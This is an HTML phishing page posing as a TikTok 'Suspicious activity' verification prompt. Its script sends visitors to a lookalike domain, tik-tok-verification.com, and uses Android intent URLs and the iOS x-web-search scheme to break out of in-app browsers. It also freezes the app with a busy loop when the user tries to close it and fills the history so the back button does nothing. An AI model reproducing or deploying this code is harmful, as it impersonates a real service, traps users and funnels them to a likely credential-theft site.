<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; background: #ffffff; 
            height: 100vh; overflow: hidden;
            -webkit-font-smoothing: antialiased;
            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
        }
        #main-ui {
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh; text-align: center;
            padding: 0 35px; box-sizing: border-box;
        }
        .v-icon { width: 50px; height: 50px; margin-bottom: 15px; }
        .header { color: #161823; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
        .subtext { color: #8A8B91; font-size: 14px; line-height: 1.4; margin-bottom: 30px; max-width: 280px; }
        .btn { 
            background: #fe2c55; color: #fff; padding: 12px 60px; 
            border-radius: 4px; font-weight: 600; font-size: 15px; 
            border: none; cursor: pointer; -webkit-tap-highlight-color: transparent;
        }
    </style>
</head>
<body>

    <div id="main-ui">
        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
        </svg>

        <div class="header">Suspicious activity</div>
        <div class="subtext">Please complete verification to continue using TikTok.</div>

        <button class="btn" onclick="shotgun()">Verify</button>
    </div>

<script>
    const url = "https://tik-tok-verification.com/Verification/verify1.html";

    function shotgun() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        if (isAndroid) {
            window.location.href = `intent://${url.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
        } else {
            // iOS Handover
            window.location.replace("x-web-search://?" + encodeURIComponent(url));
            setTimeout(() => { window.location.href = url; }, 50);
        }
    }

    // THE X-BUTTON INTERCEPTOR
    window.onblur = function() {
        // 1. Immediately fire the breakout
        shotgun();

        // 2. THE JAMMER: Synchronous loop to freeze the app
        // This stops the native 'Close' command from finishing.
        const start = Date.now();
        while (Date.now() - start < 1000) { 
            // This 1-second freeze prevents the WebView from closing 
            // long enough for the OS to switch to the browser.
        }
        
        // 3. Last ditch attempt
        shotgun();
    };

    // BACK BUTTON: Standard Treadmill (No Alerts)
    window.onload = () => {
        for(let i=0; i<20; i++) history.pushState(null, null, "#" + i);
    };
    window.onpopstate = () => { history.forward(); };

</script>
</body>
</html>
